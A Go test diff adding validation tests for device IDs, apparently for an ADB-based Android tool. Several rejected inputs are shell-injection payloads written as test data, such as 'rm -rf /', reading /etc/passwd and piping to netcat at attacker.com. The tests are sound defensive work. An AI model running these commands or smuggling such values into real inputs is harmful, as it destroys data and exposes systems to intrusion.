@@ -122,3 +122,73 @@ func TestCleanupTaskPausePartialState(t *testing.T) {
 		t.Error("Expected taskIsPaused to be deleted even without signal channel")
 	}
 }
+
+// ========================================
+// DeviceID Validation Tests
+// ========================================
+
+func TestValidateDeviceID(t *testing.T) {
+	tests := []struct {
+		name      string
+		deviceID  string
+		wantError bool
+	}{
+		// Valid device IDs
+		{"USB serial", "1234567890ABCDEF", false},
+		{"Emulator", "emulator-5554", false},
+		{"Wireless IP:port", "192.168.1.100:5555", false},
+		{"mDNS device", "adb-XXXXX._adb-tls-connect._tcp.", false},
+		{"Simple alphanumeric", "device123", false},
+		{"With underscore", "my_device_1", false},
+		{"With dots", "device.local", false},
+		{"IPv6 style", "::1:5555", false},
+
+		// Invalid device IDs
+		{"Empty", "", true},
+		{"Too long", string(make([]byte, 300)), true},
+		{"Shell injection semicolon", "device; rm -rf /", true},
+		{"Shell injection &&", "device && cat /etc/passwd", true},
+		{"Shell injection ||", "device || echo hacked", true},
+		{"Shell injection pipe", "device | nc attacker.com 1234", true},
+		{"Shell injection backtick", "device`whoami`", true},
+		{"Shell injection $", "device$(id)", true},
+		{"Shell injection parenthesis", "device()", true},
+		{"Shell injection braces", "device{}", true},
+		{"Shell injection redirect", "device > /tmp/out", true},
+		{"Shell injection single quote", "device'test'", true},
+		{"Shell injection double quote", "device\"test\"", true},
+		{"Shell injection backslash", "device\\ntest", true},
+		{"Newline", "device\ntest", true},
+		{"Tab", "device\ttest", true},
+		{"Space only", "   ", true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ValidateDeviceID(tt.deviceID)
+			if (err != nil) != tt.wantError {
+				t.Errorf("ValidateDeviceID(%q) error = %v, wantError = %v", tt.deviceID, err, tt.wantError)
+			}
+		})
+	}
+}
+
+func TestMustValidateDeviceID(t *testing.T) {
+	// Initialize logger to prevent nil pointer
+	_ = InitLogger(DefaultLogConfig())
+
+	// Valid device ID should return true
+	if !MustValidateDeviceID("valid-device-123") {
+		t.Error("Expected valid device ID to return true")
+	}
+
+	// Invalid device ID should return false
+	if MustValidateDeviceID("device; rm -rf /") {
+		t.Error("Expected invalid device ID to return false")
+	}
+
+	// Empty device ID should return false
+	if MustValidateDeviceID("") {
+		t.Error("Expected empty device ID to return false")
+	}
+}
